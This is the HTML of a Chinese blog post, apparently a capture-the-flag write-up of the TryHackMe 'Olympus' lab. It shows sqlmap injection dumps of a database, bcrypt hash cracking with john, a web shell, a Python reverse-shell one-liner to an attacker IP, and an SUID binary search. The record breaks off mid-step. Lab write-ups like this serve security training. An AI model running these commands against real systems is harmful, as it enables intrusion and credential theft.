@@ -1,0 +1,376 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_olympusroom | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.159.106 22 SSH 10.48.159.106:22  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 0   2 10.48.159.106 80 HTTP http:&#x2F;&#x2F;10.48.159.106:80 Olympus Apache-Web-Server,A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_olympusroom">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_olympusroom.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.159.106 22 SSH 10.48.159.106:22  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 0   2 10.48.159.106 80 HTTP http:&#x2F;&#x2F;10.48.159.106:80 Olympus Apache-Web-Server,A">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-18T06:36:20.000Z">
+<meta property="article:modified_time" content="2026-06-18T13:01:09.999Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="medium">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_olympusroom.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_olympusroom',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-06-18 21:01:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">100</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_olympusroom</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-18T06:36:20.000Z" title="发表于 2026-06-18 14:36:20">2026-06-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-18T13:01:09.999Z" title="更新于 2026-06-18 21:01:09">2026-06-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_olympusroom"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>Host地址</th>
+<th>端口</th>
+<th>协议</th>
+<th>Uri地址</th>
+<th>标题</th>
+<th>Banner</th>
+<th>状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>10.48.159.106</td>
+<td>22</td>
+<td>SSH</td>
+<td>10.48.159.106:22</td>
+<td></td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td>
+<td>0</td>
+</tr>
+<tr>
+<td>2</td>
+<td>10.48.159.106</td>
+<td>80</td>
+<td>HTTP</td>
+<td><a target="_blank" rel="noopener" href="http://10.48.159.106/">http://10.48.159.106:80</a></td>
+<td>Olympus</td>
+<td>Apache-Web-Server,Apache-HTTP-Server&#x2F;2.4.41,Apache&#x2F;2.4.41 (Ubuntu),jQuery</td>
+<td>200</td>
+</tr>
+</tbody></table>
+<p>直接访问会重定向，需要修改 hosts 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.48.159.106  olympus.thm</span><br></pre></td></tr></table></figure>
+<p>网站没什么信息</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../image/TryHackMe/medium/olympusroom/TryHackMe_olympusroom_20260618123800.png"></p>
+<p>目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://olympus.thm </span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">~webmaster           (Status: 301) [Size: 315] [--&gt; http://olympus.thm/~webmaster/]</span><br></pre></td></tr></table></figure>
+
+<p>访问，使用了 Victor CMS</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../image/TryHackMe/medium/olympusroom/TryHackMe_olympusroom_20260618125020.png"></p>
+<p>搜索漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# searchsploit victor cms</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Victor CMS 1.0 - &#x27;add_user&#x27; Persistent Cross-Site Scripting                                      | php/webapps/48511.txt</span><br><span class="line">Victor CMS 1.0 - &#x27;cat_id&#x27; SQL Injection                                                          | php/webapps/48485.txt</span><br><span class="line">Victor CMS 1.0 - &#x27;comment_author&#x27; Persistent Cross-Site Scripting                                | php/webapps/48484.txt</span><br><span class="line">Victor CMS 1.0 - &#x27;post&#x27; SQL Injection                                                            | php/webapps/48451.txt</span><br><span class="line">Victor CMS 1.0 - &#x27;Search&#x27; SQL Injection                                                          | php/webapps/48734.txt</span><br><span class="line">Victor CMS 1.0 - &#x27;user_firstname&#x27; Persistent Cross-Site Scripting                                | php/webapps/48626.txt</span><br><span class="line">Victor CMS 1.0 - Authenticated Arbitrary File Upload                                             | php/webapps/48490.txt</span><br><span class="line">Victor CMS 1.0 - File Upload To RCE                                                              | php/webapps/49310.txt</span><br><span class="line">Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                          | php/webapps/49282.txt</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中有一个 sql 注入漏洞<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48734">https://www.exploit-db.com/exploits/48734</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# sqlmap -u &quot;http://olympus.thm/~webmaster/search.php&quot; --data=&quot;search=1337*&amp;submit=&quot; --dbs --random-agent -v 3</span><br><span class="line">...</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] olympus</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure>
+
+<p>查看 olympus 表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# sqlmap -u &quot;http://olympus.thm/~webmaster/search.php&quot; --data=&quot;search=1337*&amp;submit=&quot; -D olympus --tables --random-agent -v 3</span><br><span class="line">...</span><br><span class="line">Database: olympus</span><br><span class="line">[6 tables]</span><br><span class="line">+------------+</span><br><span class="line">| categories |</span><br><span class="line">| chats      |</span><br><span class="line">| comments   |</span><br><span class="line">| flag       |</span><br><span class="line">| posts      |</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<p>查看 flag 表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# sqlmap -u &quot;http://olympus.thm/~webmaster/search.php&quot; --data=&quot;search=1337*&amp;submit=&quot; -D olympus -T flag --dump --random-agent -v 3 --hex</span><br><span class="line">...</span><br><span class="line">Database: olympus</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------------------+</span><br><span class="line">| flag                      |</span><br><span class="line">+---------------------------+</span><br><span class="line">| flag&#123;Sm4rt!_k33P_d1gGIng&#125; |</span><br><span class="line">+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再查看 users 表</p>
+<table>
+<thead>
+<tr>
+<th>user_id</th>
+<th>randsalt</th>
+<th>user_name</th>
+<th>user_role</th>
+<th>user_email</th>
+<th>user_password</th>
+<th>user_firstname</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3</td>
+<td>(NULL)</td>
+<td>prometheus</td>
+<td>User</td>
+<td><a href="mailto:&#x70;&#x72;&#x6f;&#x6d;&#101;&#116;&#104;&#101;&#x75;&#x73;&#64;&#111;&#108;&#x79;&#x6d;&#112;&#x75;&#115;&#x2e;&#x74;&#104;&#109;">&#x70;&#x72;&#x6f;&#x6d;&#101;&#116;&#104;&#101;&#x75;&#x73;&#64;&#111;&#108;&#x79;&#x6d;&#112;&#x75;&#115;&#x2e;&#x74;&#104;&#109;</a></td>
+<td><code>$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C</code></td>
+<td>prometheus</td>
+</tr>
+<tr>
+<td>6</td>
+<td>dgas</td>
+<td>root</td>
+<td>Admin</td>
+<td><a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x63;&#x68;&#97;&#x74;&#46;&#111;&#x6c;&#121;&#109;&#112;&#117;&#x73;&#x2e;&#x74;&#104;&#109;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x63;&#x68;&#97;&#x74;&#46;&#111;&#x6c;&#121;&#109;&#112;&#117;&#x73;&#x2e;&#x74;&#104;&#109;</a></td>
+<td><code>$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK</code></td>
+<td>root</td>
+</tr>
+<tr>
+<td>7</td>
+<td>dgas</td>
+<td>zeus</td>
+<td>User</td>
+<td><a href="mailto:&#122;&#101;&#x75;&#115;&#64;&#x63;&#x68;&#97;&#116;&#x2e;&#x6f;&#108;&#x79;&#109;&#112;&#x75;&#115;&#46;&#116;&#104;&#109;">&#122;&#101;&#x75;&#115;&#64;&#x63;&#x68;&#97;&#116;&#x2e;&#x6f;&#108;&#x79;&#109;&#112;&#x75;&#115;&#46;&#116;&#104;&#109;</a></td>
+<td><code>$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC</code></td>
+<td>zeus</td>
+</tr>
+</tbody></table>
+<p>使用 john 破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat &gt; users.hash &lt;&lt; &#x27;EOF&#x27; </span><br><span class="line">$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C</span><br><span class="line">$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK</span><br><span class="line">$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# john --wordlist=/usr/share/wordlists/rockyou.txt users.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">summertime       (?)  </span><br></pre></td></tr></table></figure>
+
+<p>破解出了一个 summertime，经过尝试是用户 prometheus 的密码<br>进入后台查看所有用户，其中另外两个用户的邮箱地址都是 chat.olympus.thm，将这个域名添加进 hosts 文件<br>![[..&#x2F;image&#x2F;TryHackMe&#x2F;medium&#x2F;olympusroom&#x2F;TryHackMe_olympusroom_20260618131908.png]]<br>访问是一个登录页面，可以使用之前的账号密码登录<br>进去是一个聊天页面，可以上传文件，但是文件名会被修改为随机字符串<br>![[..&#x2F;image&#x2F;TryHackMe&#x2F;medium&#x2F;olympusroom&#x2F;TryHackMe_olympusroom_20260618132350.png]]<br>之前 sqlmap 里面有一个 chats 表，聊天记录可能会在这个里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# sqlmap -u &quot;http://olympus.thm/~webmaster/search.php&quot; --data=&quot;search=1337*&amp;submit=&quot; -D olympus -T chats --dump --random-agent -v 3 --hex</span><br><span class="line">...</span><br><span class="line">Database: olympus</span><br><span class="line">Table: chats</span><br><span class="line">[2 entries]</span><br><span class="line">+------------+------------------------------------+------------+--------------------------------------+</span><br><span class="line">| dt         | msg                                | uname      | file                                 |</span><br><span class="line">+------------+------------------------------------+------------+--------------------------------------+</span><br><span class="line">| 2022-04-05 | Attached : prometheus_password.txt | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |</span><br><span class="line">| 2026-06-18 | Attached : shell.php               | prometheus | da6384f3f172abdecc2cdfaf156c9008.php |</span><br><span class="line">+------------+------------------------------------+------------+--------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>但是直接访问不了，目录扫描看有没有上传目录<br>果然有一个 uploads 目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://chat.olympus.thm</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">uploads              (Status: 301) [Size: 322] [--&gt; http://chat.olympus.thm/uploads/]</span><br></pre></td></tr></table></figure>
+<p>访问 shell 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-48-159-106:…/public_html/uploads# id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)</span><br><span class="line"></span><br><span class="line">www-data@ip-10-48-159-106:/home/zeus# ls -al</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 7 zeus zeus 4096 Apr 19  2022 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jun 18 04:31 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Mar 23  2022 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 .bashrc</span><br><span class="line">drwx------ 2 zeus zeus 4096 Mar 22  2022 .cache</span><br><span class="line">drwx------ 3 zeus zeus 4096 Apr 14  2022 .gnupg</span><br><span class="line">drwxrwxr-x 3 zeus zeus 4096 Mar 23  2022 .local</span><br><span class="line">-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile</span><br><span class="line">drwx------ 2 zeus zeus 4096 Apr 14  2022 .ssh</span><br><span class="line">-rw-r--r-- 1 zeus zeus    0 Mar 22  2022 .sudo_as_admin_successful</span><br><span class="line">drwx------ 3 zeus zeus 4096 Apr 14  2022 snap</span><br><span class="line">-rw-rw-r-- 1 zeus zeus   34 Mar 23  2022 user.flag</span><br><span class="line">-r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@ip-10-48-159-106:/home/zeus# cat user.flag</span><br><span class="line">flag&#123;Y0u_G0t_TH3_l1ghtN1nG_P0w3R&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于是网页 shell ，使用 python3 反弹到 kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-48-159-106:/home/zeus# python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.152.140&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+<p>查看 suid 文件，其中以 zeus 权限运行的只有 &#x2F;usr&#x2F;bin&#x2F;cputils</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-48-159-106:/home/zeus$ find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils</span><br></pre></td></tr></table></figure>
+
+<p>运行该文件，功能是复制其他文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-48-159-106:/home/zeus$ /usr/bin/cputils</span><br><span class="line">/usr/bin/cputils</span><br><span class="line">  ____ ____        _   _ _     </span><br><span class="line"> / ___|  _ \ _   _| |_(_) |___ </span><br><span class="line">| |   | |_) | | | | __| | / __|</span><br><span class="line">| |___|  __/| |_| | |_| | \__ \</span><br><span class="line"> \____|_|    \__,_|\__|_|_|___/</span><br><span class="line">                               </span><br><span class="line">Enter the Name of Source File: user.flag</span><br><span class="line">user.flag</span><br><span class="line"></span><br><span class="line">Enter the Name of Target File: 1.txt</span><br><span class="line">1.txt</span><br><span class="line"></span><br><span 